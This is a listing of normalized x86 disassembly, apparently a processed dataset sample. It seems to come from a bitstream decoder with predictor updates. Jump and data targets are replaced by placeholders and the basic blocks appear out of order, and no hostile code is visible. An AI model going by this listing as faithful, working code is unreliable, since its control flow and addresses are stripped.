jmp r-xdata
mov [ esi + 0xff0 ] eax
mov edi ebx
xor ebx ebx
sub ebp 0x1
je r-xdata
mov ebx ebp
jmp r-xdata
mov edi [ esp + 0x20 ]
mov ecx [ esi + edi * 4 + 0xfe0 ]
mov eax ebx
cdq
xor eax edx
sub eax edx
lea edx [ ecx + 0x10 ]
shr edx 0x5
sub ecx edx
add ecx eax
mov [ esi + edi * 4 + 0xfe0 ] ecx
mov ecx [ esi + edi * 4 + 0xfe8 ]
lea edx [ ecx + 0x80 ]
shr edx 0x8
sub ecx edx
add ecx eax
mov [ esi + edi * 4 + 0xfe8 ] ecx
mov edx [ esi + 0x5c ]
test edx edx
je r-xdata
mov edi edi
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
sub eax ebp
cmp eax 0x100
jae r-xdata
mov ebp ebx
mov [ esp + 0x10 ] ebx
jmp r-xdata
neg ebx
mov [ esi + 0xff4 ] edi
or ebx edi
mov edi edi
add ebx 0x18
mov [ esp + 0x10 ] ebx
add [ esi + 0x30 ] ecx
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
and eax ecx
jmp r-xdata
mov [ eax ] 0x0
cmp eax 0x10000
mov ecx eax
jae r-xdata
movsx edi [ eax + r--data ]
jmp r-xdata
add [ esi + 0x30 ] 0x1
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
mov edx [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ edx ]
mov [ esi + 0x3c ] eax
and eax 0x1
mov ecx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call ecx
add esp 0x4
shr [ esi + 0x3c ] 0x1
test eax eax
je r-xdata
cmp eax 0x1000000
jae r-xdata
shr ecx 0x8
movsx edi [ ecx + r--data ]
add edi 0x8
jmp r-xdata
mov ebp 0x1
mov ecx edi
shl ebp cl
lea ebx [ edi - 0x1 ]
sub ebp eax
sub ebp 0x1
cmp ebx [ esi + 0x74 ]
jle r-xdata
mov edx [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ edx ]
mov [ esi + 0x3c ] eax
mov ecx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call ecx
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax 0x1
test eax eax
je r-xdata
add ebx 0xffffffff
mov [ esp + 0x10 ] ebx
lea ebx [ ebx + ebp + 0x1 ]
mov eax [ esp + 0x10 ]
mov ebp ebx
lea ebx [ ebx + eax + 0x1 ]
jmp r-xdata
shr ecx 0x18
movsx edi [ ecx + r--data ]
add edi 0x18
shr ecx 0x10
movsx edi [ ecx + r--data ]
add edi 0x10
jmp r-xdata
mov eax [ esi + 0x74 ]
cmp eax 0x20
mov ebx [ esi + 0x68 ]
jle r-xdata
add edx 0x1
cmp edx [ esi + 0x58 ]
mov [ esi + 0x5c ] edx
jne r-xdata
add edi edi
sub ebp 0x1
jne r-xdata
or ebx edi
cmp [ esp + 0x18 ] 0x0
jne r-xdata
sar ebx 0x1
cmp [ esp + 0x10 ] ebp
je r-xdata
sub eax edi
add eax 0x1
lea ecx [ edi - 0x1 ]
shr [ esi + 0x68 ] cl
mov [ esi + 0x74 ] eax
mov edx [ esi + 0x5c ]
sub eax edi
add eax 0x1
mov [ esi + 0x74 ] eax
movzx edx [ edx ]
mov ecx 0x8
sub cl al
shr edx cl
mov [ esi + 0x68 ] edx
jmp r-xdata
mov edx [ esi + 0x5c ]
movzx eax [ edx ]
mov ecx [ esi + 0x74 ]
shl eax cl
add ecx 0x8
mov [ esi + 0x74 ] ecx
or [ esi + 0x68 ] eax
cmp ebx ecx
jg r-xdata
mov edx [ esi + 0x50 ]
lea eax [ esi + 0x50 ]
push eax
call edx
add esp 0x4
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov eax [ esi + 0x48 ]
mov ecx 0x1
sub [ esp + 0x18 ] ecx
test eax eax
je r-xdata
cmp [ esp + 0xc ] 0x0
jge r-xdata
lea ecx [ ebx + ebx ]
mov ebx ecx
sub ebx ebp
test eax eax
je r-xdata
and ebx [ edi * 4 + r--data ]
cmp ebx ebp
jb r-xdata
mov ecx [ esp + 0x14 ]
lea eax [ ebx + ecx ]
mov eax [ esp + 0x10 ]
sub eax ebx
jmp r-xdata
add [ esi + 0x5c ] 0x1
mov eax [ esi + 0x5c ]
cmp eax [ esi + 0x58 ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x74 ] eax
mov eax [ esi + 0x68 ]
jmp r-xdata
sub eax [ esp + 0xc ]
pop ebp
pop edi
mov [ ecx ] eax
mov eax [ esp + 0x4 ]
pop ebx
add esp 0x10
retn 0x8
mov ecx [ esp + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x5c ]
mov [ esi + 0x74 ] 0x7
movzx eax [ eax ]
mov [ esi + 0x68 ] eax
mov edx [ esi + 0x50 ]
lea eax [ esi + 0x50 ]
push eax
call edx
add esp 0x4
shr [ esi + 0x68 ] 0x1
and eax 0x1
test eax eax
je r-xdata
add ebx 0x1
sub_406ff0
sub esp 0x6c
mov eax [ esp + 0x70 ]
push ebx
push ebp
push esi
push edi
mov edi [ eax + 0x19c ]
movsx ecx [ edi + 0xc ]
mov edx [ edi + 0x8a4 ]
mov esi [ edi + 0x7c ]
mov [ esp + 0x1c ] ecx
mov ecx [ eax + 0x8c ]
mov ebp ecx
shr ebp 0x8
add ebp 0x1
mov [ esp + 0x34 ] edx
xor edx edx
mov eax esi
div ebp
mov edx [ esp + 0x1c ]
movsx ebx [ edi + 0xe ]
mov ebp edx
and ebp 0x20
mov [ esp + 0x30 ] ebx
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x50 ] eax
mov eax [ edi + 0x8b0 ]
mov [ esp + 0x18 ] eax
mov eax ebp
neg eax
sbb eax eax
and eax 0x7f8000
add eax 0x8000
cmp [ edi + 0xa ] 0x0
mov [ esp + 0x20 ] eax
je r-xdata
mov eax [ esp + 0x88 ]
add eax esi
cmp eax ecx
jbe r-xdata
test dl dl
js r-xdata
cmp [ esp + 0x88 ] 0x0
jne r-xdata
sub ecx esi
mov [ esp + 0x88 ] ecx
add eax eax
cmp [ edi + 0x8 ] 0x3
jge r-xdata
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x6c
retn
mov [ esp + 0x20 ] eax
add eax eax
mov ecx [ esp + 0x50 ]
mov esi [ esp + 0x88 ]
xor eax eax
cmp [ edi + ecx * 8 + 0x84 ] al
jne r-xdata
mov eax edi
call sub_4068c0
mov ecx [ esp + 0x80 ]
mov eax [ ecx + 0x74 ]
mov ecx [ ecx + 0x70 ]
lea esi [ edi + 0x24 ]
call sub_405780
mov ecx [ esp + 0x80 ]
cmp [ ecx + 0x98 ] 0x0
je r-xdata
mov ecx [ edi + 0x8b4 ]
mov [ esp + 0x6c ] ecx
mov ecx [ edi + 0x8b8 ]
mov [ esp + 0x70 ] ecx
mov ecx [ edi + 0x8bc ]
mov [ esp + 0x74 ] ecx
mov ecx [ edi + 0x8c0 ]
mov [ esp + 0x78 ] ecx
mov ecx [ edi + 0x8c4 ]
mov [ esp + 0x64 ] ecx
mov ecx [ edi + 0x8c8 ]
mov [ esp + 0x68 ] ecx
movzx ecx [ edi + 0xa ]
cmp cx ax
je r-xdata
cmp [ edi + 0x884 ] eax
jne r-xdata
mov edx [ esp + 0x1c ]
mov eax [ ecx + 0x78 ]
mov ecx [ ecx + 0x70 ]
lea esi [ edi + 0x50 ]
call sub_405780
test edx 0x2000
je r-xdata
test edx 0xa000
je r-xdata
mov edx [ edi + 0x7c ]
mov esi [ esp + 0x50 ]
mov [ edi + esi * 8 + 0x88 ] edx
mov eax [ edi + 0x888 ]
imul eax esi
add eax [ edi + 0x884 ]
push edi
call sub_405880
mov edx [ esp + 0x20 ]
add esp 0x4
mov [ edi + esi * 8 + 0x84 ] 0x1
mov esi [ esp + 0x88 ]
xor eax eax
mov ecx edi
call sub_4057e0
mov [ edi + 0x888 ] eax
shl eax 0x8
push eax
call sub_40fe88
add esp 0x4
mov [ edi + 0x884 ] eax
cmp ebp eax
mov ecx ebx
je r-xdata
mov ecx edx
shr ecx 0x7
not ecx
and ecx 0xffffff00
or ecx 0xfffffe00
mov [ esp + 0x28 ] ecx
mov [ esp + 0x28 ] 0xffffff00
jmp r-xdata
mov eax 0xffff8000
sar eax cl
mov [ esp + 0x44 ] eax
shl eax cl
mov [ esp + 0x3c ] eax
mov eax 0x7fff
sar eax cl
mov [ esp + 0x38 ] eax
shl eax cl
mov [ esp + 0x40 ] eax
xor eax eax
mov ebp 0xff800000
sar ebp cl
mov [ esp + 0x44 ] ebp
shl ebp cl
mov [ esp + 0x3c ] ebp
mov ebp 0x7fffff
sar ebp cl
mov [ esp + 0x38 ] ebp
shl ebp cl
mov [ esp + 0x40 ] ebp
jmp r-xdata
cmp cx 0x2
jne r-xdata
movzx ebx [ edi + 0xa ]
cmp bx ax
jne r-xdata
movzx ecx [ edi + 0x8 ]
cmp cx 0x3
mov ebp [ esp + 0x84 ]
jne r-xdata
cmp cx 0x3
jge r-xdata
test dl 0x1
je r-xdata
cmp cx 0x3
jne r-xdata
test dl 0x1
je r-xdata
mov [ esp + 0x10 ] eax
jmp r-xdata
test dl 0x1
jne r-xdata
cmp esi eax
mov [ esp + 0x10 ] eax
jbe r-xdata
movzx ebx [ edi + 0xa ]
cmp bx ax
jne r-xdata
test dl 0x2
mov [ esp + 0x10 ] eax
je r-xdata
cmp [ edi + 0xa ] 0x0
je r-xdata
cmp esi eax
mov [ esp + 0x10 ] eax
jbe r-xdata
mov ebx [ esp + 0x44 ]
cmp cx 0x3
jne r-xdata
test dl 0x1
jne r-xdata
test dl 0x10
mov [ esp + 0x14 ] ebp
je r-xdata
test dl 0x40
je r-xdata
mov esi [ esp + 0x84 ]
mov eax edx
and al 0x1
neg al
sbb eax eax
add eax 0x2
imul eax [ esp + 0x88 ]
lea ebx [ esi + eax * 4 ]
cmp esi ebx
mov eax esi
jae r-xdata
test dl dl
jns r-xdata
lea ecx [ ecx ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x70 ]
add ecx eax
mov eax [ esp + 0x6c ]
add eax ecx
cmp [ edi + 0xa ] 0x0
mov [ esp + 0x70 ] ecx
mov [ esp + 0x6c ] eax
je r-xdata
movzx ebx [ edi + 0xa ]
cmp bx ax
je r-xdata
test dl 0x2
mov ecx [ edi + 0x890 ]
mov [ esp + 0x3c ] ecx
mov ecx [ edi + 0x894 ]
mov [ esp + 0x44 ] ecx
mov ecx [ edi + 0x88c ]
mov [ esp + 0x38 ] ecx
mov ecx [ edi + 0x898 ]
mov [ esp + 0x40 ] ecx
je r-xdata
cmp esi eax
jbe r-xdata
cmp esi eax
jbe r-xdata
cmp esi eax
jbe r-xdata
cmp esi eax
jbe r-xdata
cmp [ esp + 0x24 ] 0x0
je r-xdata
nop
mov esi [ esp + 0x84 ]
mov eax 0x1
call sub_406300
mov esi [ esp + 0x70 ]
mov ecx eax
and ecx 0x1
lea edx [ ebx + ebx ]
or ecx edx
lea edx [ eax + ecx ]
sar edx 0x1
add esi edx
mov edx [ esp + 0x6c ]
sub ecx eax
mov eax [ esp + 0x74 ]
add edx esi
mov [ esp + 0x70 ] esi
mov esi [ esp + 0x78 ]
sar ecx 0x1
add esi ecx
add eax esi
cmp [ edi + 0xa ] 0x0
mov [ esp + 0x6c ] edx
mov [ esp + 0x78 ] esi
mov [ esp + 0x74 ] eax
je r-xdata
mov ecx [ esp + 0x30 ]
shl eax cl
add ebp 0x4
mov [ ebp - 0x4 ] eax
mov eax [ esp + 0x10 ]
add eax 0x1
cmp eax [ esp + 0x88 ]
mov [ esp + 0x10 ] eax
jb r-xdata
cmp eax ebx
jge r-xdata
cmp cx 0x3
jne r-xdata
test dl 0x1
je r-xdata
test dl 0x10
mov [ esp + 0x14 ] ebp
mov [ esp + 0x10 ] eax
je r-xdata
test dl 0x40
je r-xdata
jmp r-xdata
and edx 0x400
mov [ esp + 0x48 ] edx
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
and dl 0x1
neg dl
sbb edx edx
add edx 0x2
imul edx [ esp + 0x88 ]
add edx edx
add edx edx
push edx
push 0x0
push esi
call sub_40fb30
add esp 0xc
neg ebp
cmp ecx ebp
jl r-xdata
mov ecx [ esp + 0x30 ]
shl edx cl
shl eax cl
add ebp 0x4
add ebp 0x4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ esp + 0x10 ]
add eax 0x1
cmp eax [ esp + 0x88 ]
mov [ esp + 0x10 ] eax
jb r-xdata
mov ebx [ esp + 0x44 ]
cmp edx ebx
mov ecx [ esp + 0x20 ]
jge r-xdata
xor eax eax
mov esi edi
call sub_406300
cmp eax 0x80000000
je r-xdata
jmp r-xdata
mov ecx [ esp + 0x38 ]
cmp eax ecx
jle r-xdata
mov ecx [ esp + 0x20 ]
neg ecx
cmp eax ecx
jge r-xdata
movzx ebx [ edi + 0xa ]
cmp bx ax
je r-xdata
test dl 0x2
mov [ esp + 0x10 ] eax
je r-xdata
cmp esi eax
jbe r-xdata
cmp esi eax
jbe r-xdata
xor ebx ebx
cmp [ esp + 0x88 ] ebx
mov [ esp + 0x10 ] ebx
jbe r-xdata
cmp esi eax
mov [ esp + 0x10 ] eax
jbe r-xdata
push 0x0
mov esi edi
call sub_406520
mov esi eax
cmp esi 0x80000000
je r-xdata
test edx edx
mov esi edi
je r-xdata
push 0x0
mov esi edi
call sub_406520
cmp eax 0x80000000
je r-xdata
push 0x0
mov esi edi
call sub_406520
cmp eax 0x80000000
je r-xdata
mov ecx [ esp + 0x6c ]
mov edx [ esp + 0x70 ]
mov eax [ esp + 0x74 ]
mov [ edi + 0x8b4 ] ecx
mov ecx [ esp + 0x78 ]
mov [ edi + 0x8b8 ] edx
mov edx [ esp + 0x64 ]
mov [ edi + 0x8bc ] eax
mov eax [ esp + 0x68 ]
mov [ edi + 0x8c0 ] ecx
mov ecx [ esp + 0x18 ]
mov [ edi + 0x8c4 ] edx
mov edx [ esp + 0x34 ]
mov [ edi + 0x8c8 ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x8b0 ] ecx
mov [ edi + 0x8a4 ] edx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x6c
retn
add [ edi + 0x7c ] eax
mov eax [ edi + 0x7c ]
mov esi [ esp + 0x80 ]
cmp eax [ esi + 0x8c ]
jne r-xdata
add eax 0xc
cmp eax ebx
jb r-xdata
xor eax eax
mov esi edi
call sub_406300
mov ebx eax
cmp ebx 0x80000000
je r-xdata
jmp r-xdata
mov esi [ esp + 0x38 ]
cmp edx esi
jle r-xdata
mov esi ecx
neg esi
cmp edx esi
jge r-xdata
cmp eax [ esp + 0x20 ]
jle r-xdata
mov eax ebx
jmp r-xdata
mov [ esp + 0x24 ] 0x1
test dl 0x1
jne r-xdata
test edx 0x410
mov [ esp + 0x14 ] ebp
je r-xdata
cmp esi eax
jbe r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x44 ]
mov [ edi + 0x890 ] eax
mov eax [ esp + 0x38 ]
mov [ edi + 0x894 ] ecx
mov ecx [ esp + 0x40 ]
mov [ edi + 0x88c ] eax
mov [ edi + 0x898 ] ecx
jmp r-xdata
mov ebp [ esp + 0x38 ]
push 0x0
mov esi edi
call sub_406520
mov ebx eax
cmp ebx 0x80000000
je r-xdata
mov eax edx
and eax 0x1000
mov [ esp + 0x54 ] eax
jmp r-xdata
mov edx [ esp + 0x1c ]
jmp r-xdata
mov edi edi
mov ebp [ esp + 0x64 ]
mov eax [ esp + 0x70 ]
mov ebx [ esp + 0x6c ]
mov ecx ebp
imul ecx eax
add ecx 0x80
sar ecx 0x8
add ecx ebx
add ecx esi
xor edx edx
test eax eax
setge dl
xor eax eax
test esi esi
setg al
mov esi 0x1
cmp edx eax
jne r-xdata
xor eax eax
call sub_4060c0
push 0x0
call sub_405b40
jmp r-xdata
mov ecx [ esp + 0x70 ]
add ecx eax
mov eax [ esp + 0x6c ]
add eax ecx
mov [ esp + 0x70 ] ecx
mov ecx [ esp + 0x18 ]
lea edx [ eax + ecx * 2 ]
add edx ecx
mov ecx [ esp + 0x30 ]
mov [ esp + 0x6c ] eax
shl eax cl
add ebp 0x4
mov [ esp + 0x18 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ esp + 0x10 ]
add eax 0x1
cmp eax [ esp + 0x88 ]
mov [ esp + 0x10 ] eax
jb r-xdata
mov ecx [ esp + 0x70 ]
add ecx eax
add [ esp + 0x6c ] ecx
mov esi 0x4
cmp [ edi + 0x48 ] esi
mov [ esp + 0x70 ] ecx
jge r-xdata
cmp [ edi + 0x8 ] 0x3
jne r-xdata
mov ebp [ esp + 0x20 ]
mov ecx [ eax ]
cmp ecx ebp
jg r-xdata
jmp r-xdata
cmp eax ebx
jge r-xdata
cmp edx ecx
jle r-xdata
mov esi [ esp + 0x38 ]
mov edx ebx
jmp r-xdata
mov [ esp + 0x24 ] 0x1
mov eax ecx
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x6c ] eax
test dl 0x2
je r-xdata
cmp esi eax
jbe r-xdata
cmp esi eax
jbe r-xdata
mov ebx [ esp + 0x44 ]
mov eax [ esp + 0x44 ]
cmp ebp eax
jg r-xdata
test eax eax
mov esi edi
je r-xdata
push 0x0
mov esi edi
call sub_406520
cmp eax 0x80000000
mov [ esp + 0x50 ] eax
je r-xdata
push 0x1
call sub_406520
mov ecx eax
and ecx 0x1
lea edx [ ebx + ebx ]
or ecx edx
mov edx [ esp + 0x70 ]
lea esi [ eax + ecx ]
sub ecx eax
mov eax [ esp + 0x78 ]
sar esi 0x1
add edx esi
add [ esp + 0x6c ] edx
sar ecx 0x1
add eax ecx
add [ esp + 0x74 ] eax
mov esi 0x8
cmp [ edi + 0x48 ] esi
mov [ esp + 0x70 ] edx
mov [ esp + 0x78 ] eax
jge r-xdata
mov eax ebp
sub ebp esi
test eax eax
mov [ esp + 0x64 ] ebp
jne r-xdata
mov edx ebp
add ebp esi
cmp edx 0x100
mov [ esp + 0x64 ] ebp
jne r-xdata
test [ esp + 0x1c ] 0x8000
mov eax [ edi + 0x80 ]
lea ecx [ edi + 0x8cc ]
mov [ esp + 0x2c ] eax
je r-xdata
mov esi eax
cmp esi 0x80000000
je r-xdata
jmp r-xdata
mov ecx [ edi + 0x48 ]
cmp ecx 0x20
mov eax [ edi + 0x3c ]
jle r-xdata
lea esp [ esp ]
mov ebx 0x1
cmp [ esi + 0x98 ] 0x0
je r-xdata
cmp eax esi
jle r-xdata
neg ecx
cmp eax ecx
jge r-xdata
mov edx esi
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x6c ] edx
test edx 0x410
je r-xdata
cmp esi eax
mov [ esp + 0x10 ] eax
jbe r-xdata
push 0x0
mov esi edi
call sub_406520
mov esi eax
cmp esi 0x80000000
je r-xdata
mov ebx [ esp + 0x58 ]
and edx 0x400
mov [ esp + 0x48 ] edx
jmp r-xdata
mov ecx [ esp + 0x70 ]
add ecx eax
mov eax [ esp + 0x6c ]
add eax ecx
mov [ esp + 0x70 ] ecx
mov ecx [ esp + 0x18 ]
lea edx [ eax + ecx * 2 ]
add edx ecx
cmp eax ebx
mov [ esp + 0x6c ] eax
mov [ esp + 0x18 ] edx
jge r-xdata
cmp [ esp + 0x3c ] eax
push 0x1
jg r-xdata
cmp ebp [ esp + 0x3c ]
jg r-xdata
test edx 0x400
je r-xdata
push 0x0
call sub_405b40
mov ebp eax
cmp ebp 0x80000000
je r-xdata
mov [ esp + 0x10 ] ebx
push 0x1
call sub_406520
mov edx [ esp + 0x50 ]
mov ecx eax
and ecx 0x1
add edx edx
or ecx edx
mov edx [ esp + 0x70 ]
lea esi [ eax + ecx ]
sub ecx eax
mov eax [ esp + 0x78 ]
sar ecx 0x1
add eax ecx
mov ecx [ esp + 0x6c ]
sar esi 0x1
add edx esi
mov esi [ esp + 0x18 ]
add ecx edx
mov [ esp + 0x70 ] edx
mov edx [ esp + 0x74 ]
add edx eax
mov [ esp + 0x78 ] eax
lea eax [ ecx + esi * 2 ]
add eax esi
lea esi [ edx + eax * 2 ]
add esi eax
mov eax ecx
mov [ esp + 0x6c ] ecx
mov ecx [ esp + 0x30 ]
shl eax cl
mov [ esp + 0x74 ] edx
shl edx cl
add ebp 0x4
mov [ ebp - 0x4 ] eax
add ebx 0x1
mov [ ebp ] edx
add ebp 0x4
cmp ebx [ esp + 0x88 ]
mov [ esp + 0x18 ] esi
jb r-xdata
mov eax [ edi + 0x48 ]
cmp eax 0x20
mov edx [ edi + 0x3c ]
jle r-xdata
jmp r-xdata
sub ecx ebx
add ebx ecx
test [ esp + 0x1c ] 0x40
mov [ esp + 0x70 ] ecx
mov [ esp + 0x6c ] ebx
je r-xdata
mov [ esp + 0x64 ] eax
mov [ esp + 0x64 ] edx
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
add ecx 0xfffffffc
shr [ edi + 0x3c ] 0x4
mov [ edi + 0x48 ] ecx
lea edx [ ecx - 0x4 ]
mov ecx [ edi + 0x30 ]
mov [ edi + 0x48 ] edx
movzx ebx [ ecx ]
mov ecx 0x8
sub cl dl
shr ebx cl
mov [ edi + 0x3c ] ebx
jmp r-xdata
mov eax [ edi + 0x30 ]
movzx edx [ eax ]
mov ecx [ edi + 0x48 ]
shl edx cl
add ecx 0x8
mov [ edi + 0x48 ] ecx
or [ edi + 0x3c ] edx
cmp ecx esi
jl r-xdata
mov edx [ edi + 0x24 ]
lea eax [ edi + 0x24 ]
push eax
call edx
add esp 0x4
push 0x400
call sub_40fe88
mov ebp eax
mov eax [ edi + 0x48 ]
add esp 0x4
cmp eax 0x8
jge r-xdata
mov eax [ edi + 0x14 ]
mov eax [ edi + 0x18 ]
jmp r-xdata
cmp eax ecx
jle r-xdata
mov eax ebx
jmp r-xdata
mov [ esp + 0x24 ] 0x1
cmp esi eax
mov [ esp + 0x14 ] ebp
mov [ esp + 0x10 ] eax
jbe r-xdata
cmp [ esp + 0x88 ] 0x0
mov ebx ebp
mov [ esp + 0x14 ] ebx
mov [ esp + 0x10 ] 0x0
jbe r-xdata
lea ebx [ ebx ]
mov ebp [ esp + 0x64 ]
mov eax [ esp + 0x70 ]
mov ecx [ esp + 0x6c ]
mov edx ebp
imul edx eax
add edx 0x80
sar edx 0x8
add edx ecx
xor ebx ebx
add edx esi
test eax eax
setge bl
xor eax eax
test esi esi
setg al
cmp ebx eax
mov eax ebp
jne r-xdata
test edx edx
mov esi edi
je r-xdata
cmp eax [ esp + 0x38 ]
jle r-xdata
mov ecx [ esp + 0x20 ]
neg ecx
cmp eax ecx
jge r-xdata
call sub_406520
mov ebp eax
lea ecx [ ebx + ebp ]
call sub_406520
mov ecx eax
mov ebp ecx
sub ebp ebx
jmp r-xdata
push 0x1
call sub_406520
mov ecx ebx
and ecx 0x1
add eax eax
or eax ecx
mov ebp eax
lea ecx [ eax + ebx ]
sub ebp ebx
sar ecx 0x1
sar ebp 0x1
jmp r-xdata
xor eax eax
call sub_4060c0
mov ebx eax
cmp ebx 0x80000000
je r-xdata
push 0x0
call sub_405b40
mov ebx eax
cmp ebx 0x80000000
je r-xdata
push 0x1
call sub_405b40
mov esi eax
jmp r-xdata
add eax 0xfffffff8
shr [ edi + 0x3c ] 0x8
mov [ edi + 0x48 ] eax
mov ecx [ edi + 0x30 ]
add eax 0xfffffff8
mov [ edi + 0x48 ] eax
movzx esi [ ecx ]
mov ecx 0x8
sub cl al
shr esi cl
mov [ edi + 0x3c ] esi
jmp r-xdata
add [ edi + 0x30 ] 0x1
mov eax [ edi + 0x30 ]
cmp eax [ edi + 0x2c ]
jne r-xdata
mov eax [ esp + 0x18 ]
lea ecx [ ebx + eax * 2 ]
add ecx eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x30 ]
shl ebx cl
add eax 0x4
mov [ esp + 0x14 ] eax
mov [ eax - 0x4 ] ebx
cmp [ edi + 0x8a0 ] 0x8
jl r-xdata
mov ebx [ esp + 0x34 ]
mov ebx [ esp + 0x34 ]
lea ecx [ ecx ]
mov ebx [ esp + 0x34 ]
jmp r-xdata
mov edx [ esp + 0x6c ]
mov ecx [ esp + 0x18 ]
and eax 0xf
shl edx 0x4
add eax edx
lea edx [ eax + ecx * 2 ]
mov [ ebp ] eax
mov eax [ esp + 0x10 ]
add eax 0x1
add edx ecx
add ebp esi
cmp eax [ esp + 0x88 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x10 ] eax
jb r-xdata
add [ edi + 0x30 ] 0x1
mov eax [ edi + 0x30 ]
cmp eax [ edi + 0x2c ]
jne r-xdata
mov ecx [ edi + 0x2c ]
sub ecx [ edi + 0x30 ]
je r-xdata
add eax 0x8
add [ edi + 0x30 ] ebx
mov [ edi + 0x48 ] eax
test [ esi + 0x9c ] 0x4
je r-xdata
add [ esi + 0x90 ] ebx
jmp r-xdata
cmp [ esp + 0x18 ] eax
mov ebx 0x1
je r-xdata
mov eax esi
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x74 ] eax
jmp r-xdata
mov eax [ esp + 0x1c ]
and eax 0x400
mov [ esp + 0x48 ] eax
jmp r-xdata
mov ecx [ esp + 0x70 ]
add ecx eax
mov eax [ esp + 0x6c ]
add eax ecx
mov [ esp + 0x70 ] ecx
mov ecx [ esp + 0x18 ]
lea ebx [ eax + ecx * 2 ]
add ebx ecx
cmp eax [ esp + 0x44 ]
mov [ esp + 0x6c ] eax
jge r-xdata
sub ebp 0x1
test eax eax
mov [ esp + 0x64 ] ebp
jne r-xdata
add ebp 0x1
cmp eax 0x100
mov [ esp + 0x64 ] ebp
jne r-xdata
push 0x0
call sub_406520
lea ecx [ esp + 0x58 ]
push ecx
push 0x0
call sub_406a50
mov ebx [ esp + 0x58 ]
jmp r-xdata
mov ecx [ esp + 0x30 ]
shl eax cl
cmp eax [ esp + 0x20 ]
jle r-xdata
mov edx [ esp + 0x3c ]
mov [ ebp ] edx
jmp r-xdata
mov [ esp + 0x24 ] 0x1
sub edx 0x1
test ecx ecx
mov [ esp + 0x64 ] edx
jne r-xdata
add edx 0x1
cmp ecx 0x100
mov [ esp + 0x64 ] edx
jne r-xdata
lea eax [ ecx + ebp ]
sar eax 0x1
cdq
mov esi eax
mov eax [ esp + 0x38 ]
xor esi edx
sub esi edx
mov edx eax
sar edx 0x8
sub esi edx
add eax esi
mov [ esp + 0x38 ] eax
mov eax ecx
cdq
mov esi eax
mov eax [ esp + 0x3c ]
xor esi edx
sub esi edx
mov edx eax
sar edx 0x8
sub esi edx
add eax esi
mov [ esp + 0x3c ] eax
mov eax ebp
cdq
mov esi eax
mov eax [ esp + 0x44 ]
xor esi edx
sub esi edx
mov edx eax
sar edx 0x8
sub esi edx
mov edx [ esp + 0x64 ]
add eax esi
mov esi [ esp + 0x68 ]
imul esi [ esp + 0x78 ]
mov [ esp + 0x44 ] eax
mov eax edx
imul eax [ esp + 0x70 ]
add eax 0x80
add esi 0x80
sar eax 0x8
add eax ecx
add eax [ esp + 0x6c ]
sar esi 0x8
add esi ebp
add esi [ esp + 0x74 ]
xor ebx ebx
test ecx ecx
setg bl
xor ecx ecx
cmp [ esp + 0x70 ] ecx
setge cl
cmp ecx ebx
mov ecx edx
jne r-xdata
mov eax 0x1
call sub_4060c0
mov edx [ esp + 0x44 ]
mov ecx eax
mov eax [ esp + 0x38 ]
cmp eax edx
jg r-xdata
push 0x1
call sub_405b40
mov esi [ esp + 0x38 ]
mov edx [ esp + 0x44 ]
mov ecx [ esp + 0x3c ]
mov ebp [ esp + 0x40 ]
add ebp esi
cmp edx ecx
lea esi [ edx + ecx ]
jle r-xdata
test [ esp + 0x1c ] 0x8000
mov ecx [ edi + 0x80 ]
lea eax [ edi + 0x8cc ]
mov [ esp + 0x2c ] ecx
je r-xdata
push 0x0
mov esi edi
call sub_406520
mov ebx eax
cmp ebx 0x80000000
je r-xdata
jmp r-xdata
mov ecx [ esp + 0x6c ]
mov eax edx
sar eax 0x4
and eax 0xf
shl ecx 0x4
add eax ecx
mov ecx [ esp + 0x18 ]
mov [ ebp ] eax
lea eax [ eax + ecx * 2 ]
add eax ecx
mov ecx [ esp + 0x74 ]
and edx 0xf
shl ecx 0x4
add edx ecx
add ebp 0x4
mov [ ebp ] edx
lea edx [ edx + eax * 2 ]
add edx eax
mov eax [ esp + 0x10 ]
add eax 0x1
add ebp 0x4
cmp eax [ esp + 0x88 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x10 ] eax
jb r-xdata
mov edx [ edi + 0x30 ]
movzx eax [ edx ]
mov ecx [ edi + 0x48 ]
shl eax cl
add ecx esi
mov [ edi + 0x48 ] ecx
or [ edi + 0x3c ] eax
cmp ecx esi
jl r-xdata
lea eax [ edi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
jmp r-xdata
mov ebp 0x4
cmp [ edi + 0x48 ] ebp
jge r-xdata
mov eax [ edi + 0x48 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
lea ecx [ esi + eax * 2 ]
add ecx eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x30 ]
shl esi cl
add eax 0x4
mov [ eax - 0x4 ] esi
cmp [ edi + 0x8a0 ] 0x8
